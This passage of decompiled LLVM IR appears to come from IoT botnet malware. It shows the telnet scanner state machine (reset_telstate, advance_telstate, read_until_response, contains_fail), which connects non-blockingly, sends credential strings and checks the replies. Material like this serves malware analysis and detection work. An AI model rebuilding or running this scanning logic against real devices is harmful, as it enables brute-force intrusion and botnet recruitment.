dec_label_pc_8050f8b:                             ; preds = %dec_label_pc_8050f7f
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v0_8050f9f = load i32, i32* @esp, align 4
  %v2_8050fa2 = add i32 %v0_8050f9f, -16
  %v3_8050fa2 = inttoptr i32 %v2_8050fa2 to i32*
  store i32 %v2_8050cb3, i32* %v3_8050fa2, align 4
  %v1_8050fa3 = call i32 @reset_telstate(i32 %v5_8050eb7)
  store i32 %v1_8050fa3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8050fb0:                             ; preds = %dec_label_pc_8050f7f.dec_label_pc_8050fb0_crit_edge, %dec_label_pc_8050f05
  %v0_8050fc4 = phi i32 [ %v0_8050fc4.pre, %dec_label_pc_8050f7f.dec_label_pc_8050fb0_crit_edge ], [ %v1_8050f77, %dec_label_pc_8050f05 ]
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v1_8050fc7 = add i32 %v0_8050fc4, -12
  %v2_8050fc7 = inttoptr i32 %v1_8050fc7 to i32*
  store i32 1, i32* %v2_8050fc7, align 4
  %v0_8050fc9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050fc9 = add i32 %v0_8050fc4, -16
  %v3_8050fc9 = inttoptr i32 %v2_8050fc9 to i32*
  store i32 %v0_8050fc9, i32* %v3_8050fc9, align 4
  %v1_8050fca = load i32, i32* %stack_var_-596, align 4
  %v2_8050fca = inttoptr i32 %v5_8050eb7 to i32*
  %v3_8050fca = call i32 @advance_telstate(i32* %v2_8050fca, i32 %v1_8050fca)
  store i32 %v3_8050fca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8050fd7:                             ; preds = %dec_label_pc_8050ca2
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8050fe1, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8050fe8 = call i8* @_memset(i8* %tmp41, i32 0, i32 32)
  %v6_8050fe8 = ptrtoint i8* %v5_8050fe8 to i32
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_8051001 = inttoptr i32 %v2_8050cb3 to i32*
  %v4_8051001 = load i32, i32* %v3_8051001, align 4
  %v2_8051006 = udiv i32 %v4_8051001, 32
  store i32 %v2_8051006, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_805101a = load i32, i32* %v3_8051001, align 4
  %v1_805101d = urem i32 %v4_805101a, 32
  store i32 %v1_805101d, i32* %eax.global-to-local, align 4
  %v0_8051020 = load i32, i32* @ebp, align 4
  %v2_8051020 = mul nuw nsw i32 %v2_8051006, 4
  %v3_8051020 = add nsw i32 %v2_8051020, -312
  %v4_8051020 = add i32 %v3_8051020, %v0_8051020
  %v5_8051020 = inttoptr i32 %v4_8051020 to i32*
  %v6_8051020 = load i32, i32* %v5_8051020, align 4
  %v9_8051020 = shl i32 1, %v1_805101d
  %v12_8051020 = or i32 %v6_8051020, %v9_8051020
  store i32 %v12_8051020, i32* %v5_8051020, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_805104c = load i32, i32* %v3_8051001, align 4
  %v1_805104f = add i32 %v4_805104c, 1
  store i32 %v1_805104f, i32* %edx.global-to-local, align 4
  %v0_8051052 = load i32, i32* @esp, align 4
  %v2_805105b = add i32 %v0_8051052, -16
  %v3_805105b = inttoptr i32 %v2_805105b to i32*
  store i32 %v2_8051055, i32* %v3_805105b, align 4
  %v1_805105c = add i32 %v0_8051052, -20
  %v2_805105c = inttoptr i32 %v1_805105c to i32*
  store i32 0, i32* %v2_805105c, align 4
  store i32 %v2_8050fe1, i32* %eax.global-to-local, align 4
  %v2_8051064 = add i32 %v0_8051052, -24
  %v3_8051064 = inttoptr i32 %v2_8051064 to i32*
  store i32 %v2_8050fe1, i32* %v3_8051064, align 4
  %v1_8051065 = add i32 %v0_8051052, -28
  %v2_8051065 = inttoptr i32 %v1_8051065 to i32*
  store i32 0, i32* %v2_8051065, align 4
  %v0_8051067 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051067 = add i32 %v0_8051052, -32
  %v3_8051067 = inttoptr i32 %v2_8051067 to i32*
  store i32 %v0_8051067, i32* %v3_8051067, align 4
  %v0_8051068 = load i32, i32* %stack_var_-324, align 4
  %v2_8051068 = load i32, i32* %stack_var_-316, align 4
  %v5_8051068 = call i32 @__libc_select(i32 %v0_8051068, i32 %arg1, i32 %v2_8051068, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051068, i32* %eax.global-to-local, align 4
  %v0_805106d = load i32, i32* @esp, align 4
  %v12_8051073 = icmp eq i32 %v5_8051068, 1
  %v1_8051077 = icmp eq i1 %v12_8051073, false
  br i1 %v1_8051077, label %dec_label_pc_805117e, label %dec_label_pc_805107d

dec_label_pc_805107d:                             ; preds = %dec_label_pc_8050fd7
  store i32 0, i32* %v4_8050c76, align 4
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_80510bb = load i32, i32* %v3_8051001, align 4
  store i32 %v4_80510bb, i32* %edx.global-to-local, align 4
  %v0_80510be = load i32, i32* @esp, align 4
  %v2_80510c7 = add i32 %v0_80510be, -16
  %v3_80510c7 = inttoptr i32 %v2_80510c7 to i32*
  store i32 %v2_80510c1, i32* %v3_80510c7, align 4
  store i32 %v2_80510c8, i32* %eax.global-to-local, align 4
  %v2_80510ce = add i32 %v0_80510be, -20
  %v3_80510ce = inttoptr i32 %v2_80510ce to i32*
  store i32 %v2_80510c8, i32* %v3_80510ce, align 4
  %v1_80510cf = add i32 %v0_80510be, -24
  %v2_80510cf = inttoptr i32 %v1_80510cf to i32*
  store i32 4, i32* %v2_80510cf, align 4
  %v1_80510d1 = add i32 %v0_80510be, -28
  %v2_80510d1 = inttoptr i32 %v1_80510d1 to i32*
  store i32 1, i32* %v2_80510d1, align 4
  %v0_80510d3 = load i32, i32* %edx.global-to-local, align 4
  %v2_80510d3 = add i32 %v0_80510be, -32
  %v3_80510d3 = inttoptr i32 %v2_80510d3 to i32*
  store i32 %v0_80510d3, i32* %v3_80510d3, align 4
  %v0_80510d4 = load i32, i32* %stack_var_-332, align 4
  %v2_80510d4 = call i32 @getsockopt(i32 %v0_80510d4)
  %v0_80510d9 = load i32, i32* @esp, align 4
  %v3_80510dc = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_80510dc, i32* %eax.global-to-local, align 4
  %v1_80510e2 = icmp eq i32 %v3_80510dc, 0
  br i1 %v1_80510e2, label %dec_label_pc_805110b, label %dec_label_pc_80510e6

dec_label_pc_80510e6:                             ; preds = %dec_label_pc_805107d
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v2_80510fd = add i32 %v0_80510d9, 16
  %v3_80510fd = inttoptr i32 %v2_80510fd to i32*
  store i32 %v2_8050cb3, i32* %v3_80510fd, align 4
  %v0_80510fe = load i32, i32* %stack_var_-332, align 4
  %v1_80510fe = call i32 @reset_telstate(i32 %v0_80510fe)
  store i32 %v1_80510fe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_805110b:                             ; preds = %dec_label_pc_805107d
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_805111c = load i32, i32* %v3_8051001, align 4
  store i32 %v4_805111c, i32* %eax.global-to-local, align 4
  %v1_8051122 = add i32 %v0_80510d9, 24
  %v2_8051122 = inttoptr i32 %v1_8051122 to i32*
  store i32 0, i32* %v2_8051122, align 4
  %v1_8051124 = add i32 %v0_80510d9, 20
  %v2_8051124 = inttoptr i32 %v1_8051124 to i32*
  store i32 3, i32* %v2_8051124, align 4
  %v0_8051126 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051126 = add i32 %v0_80510d9, 16
  %v3_8051126 = inttoptr i32 %v2_8051126 to i32*
  store i32 %v0_8051126, i32* %v3_8051126, align 4
  %v0_8051127 = load i32, i32* %stack_var_-332, align 4
  %v1_8051127 = call i32 @fcntl(i32 %v0_8051127)
  %v0_805112c = load i32, i32* @esp, align 4
  %v13_8051131 = and i32 %v1_8051127, -2049
  store i32 %v13_8051131, i32* @ecx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ebx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_8051145 = load i32, i32* %v3_8051001, align 4
  store i32 %v4_8051145, i32* %eax.global-to-local, align 4
  %v2_805114b = add i32 %v0_805112c, 8
  %v3_805114b = inttoptr i32 %v2_805114b to i32*
  store i32 %v13_8051131, i32* %v3_805114b, align 4
  %v1_805114c = add i32 %v0_805112c, 4
  %v2_805114c = inttoptr i32 %v1_805114c to i32*
  store i32 4, i32* %v2_805114c, align 4
  %v0_805114e = load i32, i32* %eax.global-to-local, align 4
  %v3_805114e = inttoptr i32 %v0_805112c to i32*
  store i32 %v0_805114e, i32* %v3_805114e, align 4
  %v0_805114f = load i32, i32* %stack_var_-332, align 4
  %v1_805114f = call i32 @fcntl(i32 %v0_805114f)
  %v0_8051154 = load i32, i32* @esp, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v1_805116e = add i32 %v0_8051154, 4
  %v2_805116e = inttoptr i32 %v1_805116e to i32*
  store i32 2, i32* %v2_805116e, align 4
  %v0_8051170 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051170 = inttoptr i32 %v0_8051154 to i32*
  store i32 %v0_8051170, i32* %v3_8051170, align 4
  %v0_8051171 = load i32, i32* %stack_var_-332, align 4
  %v1_8051171 = load i32, i32* %stack_var_-328, align 4
  %v2_8051171 = inttoptr i32 %v0_8051171 to i32*
  %v3_8051171 = call i32 @advance_telstate(i32* %v2_8051171, i32 %v1_8051171)
  store i32 %v3_8051171, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_805117e:                             ; preds = %dec_label_pc_8050fd7
  %v13_805117e = icmp eq i32 %v5_8051068, -1
  %v1_8051182 = icmp eq i1 %v13_805117e, false
  br i1 %v1_8051182, label %dec_label_pc_80511a9, label %dec_label_pc_8051184

dec_label_pc_8051184:                             ; preds = %dec_label_pc_805117e
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v2_805119b = add i32 %v0_805106d, 16
  %v3_805119b = inttoptr i32 %v2_805119b to i32*
  store i32 %v2_8050cb3, i32* %v3_805119b, align 4
  %v1_805119c = call i32 @reset_telstate(i32 %v5_8051068)
  store i32 %v1_805119c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_80511a9:                             ; preds = %dec_label_pc_805117e
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v5_80511ba = load i32, i32* %v4_8050c76, align 4
  store i32 %v5_80511ba, i32* %eax.global-to-local, align 4
  %v1_80511be = add i32 %v5_80511ba, 7
  store i32 %v1_80511be, i32* @ebx, align 4
  %v1_80511c4 = add i32 %v0_805106d, 16
  %v2_80511c4 = inttoptr i32 %v1_80511c4 to i32*
  store i32 0, i32* %v2_80511c4, align 4
  %v1_80511c6 = inttoptr i32 %v5_8051068 to i32*
  %v2_80511c6 = call i32 @__GI_time(i32* %v1_80511c6)
  store i32 %v2_80511c6, i32* %eax.global-to-local, align 4
  %v0_80511ce = load i32, i32* @ebx, align 4
  %v7_80511ce = icmp ult i32 %v0_80511ce, %v2_80511c6
  %v1_80511d0 = icmp eq i1 %v7_80511ce, false
  br i1 %v1_80511d0, label %dec_label_pc_8051d87, label %dec_label_pc_80511d6

dec_label_pc_80511d6:                             ; preds = %dec_label_pc_80511a9
  %v0_80511cb = load i32, i32* @esp, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v3_80511ed = inttoptr i32 %v0_80511cb to i32*
  store i32 %v2_8050cb3, i32* %v3_80511ed, align 4
  %v0_80511ee = load i32, i32* %stack_var_-332, align 4
  %v1_80511ee = call i32 @reset_telstate(i32 %v0_80511ee)
  store i32 %v1_80511ee, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_80511fb:                             ; preds = %dec_label_pc_8050ca2
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_805120e = add i32 %v2_8050cb3, 16
  store i32 %v1_805120e, i32* %eax.global-to-local, align 4
  %v1_8051211 = add i32 %v2_8050cb3, 19
  %v2_8051211 = inttoptr i32 %v1_8051211 to i32*
  %v3_8051211 = load i32, i32* %v2_8051211, align 4
  store i32 %v3_8051211, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_8051225 = inttoptr i32 %v2_8050cb3 to i32*
  %v4_8051225 = load i32, i32* %v3_8051225, align 4
  store i32 %v4_8051225, i32* %eax.global-to-local, align 4
  %v0_8051228 = load i32, i32* @esp, align 4
  %v1_805122b = add i32 %v0_8051228, -16
  %v2_805122b = inttoptr i32 %v1_805122b to i32*
  store i32 134674040, i32* %v2_805122b, align 4
  %v1_8051230 = add i32 %v0_8051228, -20
  %v2_8051230 = inttoptr i32 %v1_8051230 to i32*
  store i32 1024, i32* %v2_8051230, align 4
  %v0_8051235 = load i32, i32* @ebx, align 4
  %v2_8051235 = add i32 %v0_8051228, -24
  %v3_8051235 = inttoptr i32 %v2_8051235 to i32*
  store i32 %v0_8051235, i32* %v3_8051235, align 4
  %v5_8051236 = add i32 %v0_8051228, -28
  %v6_8051236 = inttoptr i32 %v5_8051236 to i32*
  store i32 %arg1, i32* %v6_8051236, align 4
  %v0_8051239 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051239 = add i32 %v0_8051228, -32
  %v3_8051239 = inttoptr i32 %v2_8051239 to i32*
  store i32 %v0_8051239, i32* %v3_8051239, align 4
  %v1_805123a = call i32 @read_until_response(i32 %v3_8050cb8)
  store i32 %v1_805123a, i32* %eax.global-to-local, align 4
  %v0_805123f = load i32, i32* @esp, align 4
  %v1_8051242 = icmp eq i32 %v1_805123a, 0
  br i1 %v1_8051242, label %dec_label_pc_80512e5, label %dec_label_pc_805124a

dec_label_pc_805124a:                             ; preds = %dec_label_pc_80511fb
  store i32 %storemerge53, i32* @ebx, align 4
  %v1_8051250 = add i32 %v0_805123f, 16
  %v2_8051250 = inttoptr i32 %v1_8051250 to i32*
  store i32 0, i32* %v2_8051250, align 4
  %v0_8051252 = load i32, i32* %stack_var_-332, align 4
  %v1_8051252 = inttoptr i32 %v0_8051252 to i32*
  %v2_8051252 = call i32 @__GI_time(i32* %v1_8051252)
  %v0_805125f = load i32, i32* @ebx, align 4
  %v2_8051268 = mul i32 %v0_805125f, 23
  %v4_805126a = add i32 %v2_8050c76, %v2_8051268
  %v5_805126a = inttoptr i32 %v4_805126a to i32*
  store i32 %v2_8051252, i32* %v5_805126a, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v1_805120e, i32* %eax.global-to-local, align 4
  %v3_8051284 = load i32, i32* %v2_8051211, align 4
  store i32 %v3_8051284, i32* %eax.global-to-local, align 4
  %v0_8051287 = load i32, i32* @esp, align 4
  %v2_805128a = add i32 %v0_8051287, -16
  %v3_805128a = inttoptr i32 %v2_805128a to i32*
  store i32 %v3_8051284, i32* %v3_805128a, align 4
  %v0_805128b = load i32, i32* %stack_var_-332, align 4
  %v1_805128b = call i32 @contains_fail(i32 %v0_805128b)
  %v0_8051290 = load i32, i32* @esp, align 4
  %v1_8051293 = icmp eq i32 %v1_805128b, 0
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v1_80512d5 = add i32 %v0_8051290, 4
  %v2_80512d5 = inttoptr i32 %v1_80512d5 to i32*
  br i1 %v1_8051293, label %dec_label_pc_80512be, label %dec_label_pc_8051297

dec_label_pc_8051297:                             ; preds = %dec_label_pc_805124a
  store i32 0, i32* %v2_80512d5, align 4
  %v0_80512b0 = load i32, i32* %eax.global-to-local, align 4
  %v3_80512b0 = inttoptr i32 %v0_8051290 to i32*
  store i32 %v0_80512b0, i32* %v3_80512b0, align 4
  %v0_80512b1 = load i32, i32* %stack_var_-332, align 4
  %v1_80512b1 = load i32, i32* %stack_var_-328, align 4
  %v2_80512b1 = inttoptr i32 %v0_80512b1 to i32*
  %v3_80512b1 = call i32 @advance_telstate(i32* %v2_80512b1, i32 %v1_80512b1)
  store i32 %v3_80512b1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_80512be:                             ; preds = %dec_label_pc_805124a
  store i32 3, i32* %v2_80512d5, align 4
  %v0_80512d7 = load i32, i32* %eax.global-to-local, align 4
  %v3_80512d7 = inttoptr i32 %v0_8051290 to i32*
  store i32 %v0_80512d7, i32* %v3_80512d7, align 4
  %v0_80512d8 = load i32, i32* %stack_var_-332, align 4
  %v1_80512d8 = load i32, i32* %stack_var_-328, align 4
  %v2_80512d8 = inttoptr i32 %v0_80512d8 to i32*
  %v3_80512d8 = call i32 @advance_telstate(i32* %v2_80512d8, i32 %v1_80512d8)
  store i32 %v3_80512d8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_80512e5:                             ; preds = %dec_label_pc_80511fb
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v5_80512f6 = load i32, i32* %v4_8050c76, align 4
  store i32 %v5_80512f6, i32* %eax.global-to-local, align 4
  %v1_80512fa = add i32 %v5_80512f6, 7
  store i32 %v1_80512fa, i32* @ebx, align 4
  %v1_8051300 = add i32 %v0_805123f, 16
  %v2_8051300 = inttoptr i32 %v1_8051300 to i32*
  store i32 0, i32* %v2_8051300, align 4
  %v0_8051302 = load i32, i32* %stack_var_-332, align 4
  %v1_8051302 = inttoptr i32 %v0_8051302 to i32*
  %v2_8051302 = call i32 @__GI_time(i32* %v1_8051302)
  store i32 %v2_8051302, i32* %eax.global-to-local, align 4
  %v0_805130a = load i32, i32* @ebx, align 4
  %v7_805130a = icmp ult i32 %v0_805130a, %v2_8051302
  %v1_805130c = icmp eq i1 %v7_805130a, false
  br i1 %v1_805130c, label %dec_label_pc_8051d87, label %dec_label_pc_8051312

dec_label_pc_8051312:                             ; preds = %dec_label_pc_80512e5
  %v0_8051307 = load i32, i32* @esp, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v3_8051329 = inttoptr i32 %v0_8051307 to i32*
  store i32 %v2_8050cb3, i32* %v3_8051329, align 4
  %v0_805132a = load i32, i32* %stack_var_-332, align 4
  %v1_805132a = call i32 @reset_telstate(i32 %v0_805132a)
  store i32 %v1_805132a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8051337:                             ; preds = %dec_label_pc_8050ca2
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_805134a = add i32 %v2_8050cb3, 10
  store i32 %v1_805134a, i32* %eax.global-to-local, align 4
  %v1_805134d = inttoptr i32 %v1_805134a to i8*
  %v2_805134d = load i8, i8* %v1_805134d, align 1
  %v3_805134d = zext i8 %v2_805134d to i32
  store i32 %v3_805134d, i32* %eax.global-to-local, align 4
  %v1_8051354 = mul nuw nsw i32 %v3_805134d, 4
  %v2_8051354 = add nuw nsw i32 %v1_8051354, 134673440
  %v3_8051354 = inttoptr i32 %v2_8051354 to i32*
  %v4_8051354 = load i32, i32* %v3_8051354, align 4
  %v1_8051366 = and i32 %v4_8051354, -256
  store i32 %v1_8051366, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8051369 = inttoptr i32 %v4_8051354 to i8*
  store i32 %v4_8051354, i32* @edi, align 4
  %v3_805136f = call i32 @_strlen(i8* %v4_8051369)
  store i32 %v3_805136f, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v1_805134a, i32* %eax.global-to-local, align 4
  %v2_805138e = load i8, i8* %v1_805134d, align 1
  %v3_805138e = zext i8 %v2_805138e to i32
  store i32 %v3_805138e, i32* %eax.global-to-local, align 4
  %v1_8051395 = mul nuw nsw i32 %v3_805138e, 4
  %v2_8051395 = add nuw nsw i32 %v1_8051395, 134673440
  %v3_8051395 = inttoptr i32 %v2_8051395 to i32*
  %v4_8051395 = load i32, i32* %v3_8051395, align 4
  store i32 %v4_8051395, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_80513ad = inttoptr i32 %v2_8050cb3 to i32*
  %v4_80513ad = load i32, i32* %v3_80513ad, align 4
  store i32 %v4_80513ad, i32* %eax.global-to-local, align 4
  %v0_80513b0 = load i32, i32* @esp, align 4
  %v1_80513b0 = add i32 %v0_80513b0, -4
  %v2_80513b0 = inttoptr i32 %v1_80513b0 to i32*
  store i32 16384, i32* %v2_80513b0, align 4
  %v0_80513b5 = load i32, i32* @ebx, align 4
  %v2_80513b5 = add i32 %v0_80513b0, -8
  %v3_80513b5 = inttoptr i32 %v2_80513b5 to i32*
  store i32 %v0_80513b5, i32* %v3_80513b5, align 4
  %v0_80513b6 = load i32, i32* @esi, align 4
  %v2_80513b6 = add i32 %v0_80513b0, -12
  %v3_80513b6 = inttoptr i32 %v2_80513b6 to i32*
  store i32 %v0_80513b6, i32* %v3_80513b6, align 4
  %v0_80513b7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80513b7 = add i32 %v0_80513b0, -16
  %v3_80513b7 = inttoptr i32 %v2_80513b7 to i32*
  store i32 %v0_80513b7, i32* %v3_80513b7, align 4
  %v4_80513b8 = call i32 @send(i32 %v4_8051354, i32 %v2_8050bbb, i32 %v3_8050cb8, i32 %v15_8050afb)
  store i32 %v4_80513b8, i32* %eax.global-to-local, align 4
  %v0_80513bd = load i32, i32* @esp, align 4
  %v2_80513c0 = icmp slt i32 %v4_80513b8, 0
  %v1_80513c2 = icmp eq i1 %v2_80513c0, false
  br i1 %v1_80513c2, label %dec_label_pc_80513e9, label %dec_label_pc_80513c4

dec_label_pc_80513c4:                             ; preds = %dec_label_pc_8051337
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v3_80513db = inttoptr i32 %v0_80513bd to i32*
  store i32 %v2_8050cb3, i32* %v3_80513db, align 4
  %v1_80513dc = call i32 @reset_telstate(i32 %v4_8051354)
  store i32 %v1_80513dc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_80513e9:                             ; preds = %dec_label_pc_8051337
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_80513fa = load i32, i32* %v3_80513ad, align 4
  store i32 %v4_80513fa, i32* %eax.global-to-local, align 4
  %v1_80513fd = add i32 %v0_80513bd, 12
  %v2_80513fd = inttoptr i32 %v1_80513fd to i32*
  store i32 16384, i32* %v2_80513fd, align 4
  %v1_8051402 = add i32 %v0_80513bd, 8
  %v2_8051402 = inttoptr i32 %v1_8051402 to i32*
  store i32 2, i32* %v2_8051402, align 4
  %v1_8051404 = add i32 %v0_80513bd, 4
  %v2_8051404 = inttoptr i32 %v1_8051404 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_806a228.281 to i32), i32* %v2_8051404, align 4
  %v0_8051409 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051409 = inttoptr i32 %v0_80513bd to i32*
  store i32 %v0_8051409, i32* %v3_8051409, align 4
  %v4_805140a = call i32 @send(i32 %v4_8051354, i32 %v2_8050bbb, i32 %v3_8050cb8, i32 %v15_8050afb)
  %v0_805140f = load i32, i32* @esp, align 4
  %v2_8051412 = icmp slt i32 %v4_805140a, 0
  %v1_8051414 = icmp eq i1 %v2_8051412, false
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  br i1 %v1_8051414, label %dec_label_pc_805143b, label %dec_label_pc_8051416

dec_label_pc_8051416:                             ; preds = %dec_label_pc_80513e9
  %v3_805142d = inttoptr i32 %v0_805140f to i32*
  store i32 %v2_8050cb3, i32* %v3_805142d, align 4
  %v1_805142e = call i32 @reset_telstate(i32 %v4_8051354)
  store i32 %v1_805142e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_805143b:                             ; preds = %dec_label_pc_80513e9
  %v1_8051452 = add i32 %v0_805140f, 4
  %v2_8051452 = inttoptr i32 %v1_8051452 to i32*
  store i32 4, i32* %v2_8051452, align 4
  %v0_8051454 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051454 = inttoptr i32 %v0_805140f to i32*
  store i32 %v0_8051454, i32* %v3_8051454, align 4
  %v2_8051455 = inttoptr i32 %v4_8051354 to i32*
  %v3_8051455 = call i32 @advance_telstate(i32* %v2_8051455, i32 %v2_8050bbb)
  store i32 %v3_8051455, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8051462:                             ; preds = %dec_label_pc_8050ca2
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8051475 = add i32 %v2_8050cb3, 16
  store i32 %v1_8051475, i32* %eax.global-to-local, align 4
  %v1_8051478 = add i32 %v2_8050cb3, 19
  %v2_8051478 = inttoptr i32 %v1_8051478 to i32*
  %v3_8051478 = load i32, i32* %v2_8051478, align 4
  store i32 %v3_8051478, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_805148c = inttoptr i32 %v2_8050cb3 to i32*
  %v4_805148c = load i32, i32* %v3_805148c, align 4
  store i32 %v4_805148c, i32* %eax.global-to-local, align 4
  %v0_805148f = load i32, i32* @esp, align 4
  %v1_8051492 = add i32 %v0_805148f, -16
  %v2_8051492 = inttoptr i32 %v1_8051492 to i32*
  store i32 ptrtoint (i32* @global_var_806f678 to i32), i32* %v2_8051492, align 4
  %v1_8051497 = add i32 %v0_805148f, -20
  %v2_8051497 = inttoptr i32 %v1_8051497 to i32*
  store i32 1024, i32* %v2_8051497, align 4
  %v0_805149c = load i32, i32* @ebx, align 4
  %v2_805149c = add i32 %v0_805148f, -24
  %v3_805149c = inttoptr i32 %v2_805149c to i32*
  store i32 %v0_805149c, i32* %v3_805149c, align 4
  %v5_805149d = add i32 %v0_805148f, -28
  %v6_805149d = inttoptr i32 %v5_805149d to i32*
  store i32 %arg1, i32* %v6_805149d, align 4
  %v0_80514a0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80514a0 = add i32 %v0_805148f, -32
  %v3_80514a0 = inttoptr i32 %v2_80514a0 to i32*
  store i32 %v0_80514a0, i32* %v3_80514a0, align 4
  %v1_80514a1 = call i32 @read_until_response(i32 %v3_8050cb8)
  store i32 %v1_80514a1, i32* %eax.global-to-local, align 4
  %v0_80514a6 = load i32, i32* @esp, align 4
  %v1_80514a9 = icmp eq i32 %v1_80514a1, 0
  br i1 %v1_80514a9, label %dec_label_pc_805154c, label %dec_label_pc_80514b1

dec_label_pc_80514b1:                             ; preds = %dec_label_pc_8051462
  store i32 %storemerge53, i32* @ebx, align 4
  %v1_80514b7 = add i32 %v0_80514a6, 16
  %v2_80514b7 = inttoptr i32 %v1_80514b7 to i32*
  store i32 0, i32* %v2_80514b7, align 4
  %v1_80514b9 = inttoptr i32 %stack_var_-624.251 to i32*
  %v2_80514b9 = call i32 @__GI_time(i32* %v1_80514b9)
  %v0_80514c6 = load i32, i32* @ebx, align 4
  %v2_80514cf = mul i32 %v0_80514c6, 23
  %v4_80514d1 = add i32 %v2_8050c76, %v2_80514cf
  %v5_80514d1 = inttoptr i32 %v4_80514d1 to i32*
  store i32 %v2_80514b9, i32* %v5_80514d1, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v1_8051475, i32* %eax.global-to-local, align 4
  %v3_80514eb = load i32, i32* %v2_8051478, align 4
  store i32 %v3_80514eb, i32* %eax.global-to-local, align 4
  %v0_80514ee = load i32, i32* @esp, align 4
  %v2_80514f1 = add i32 %v0_80514ee, -16
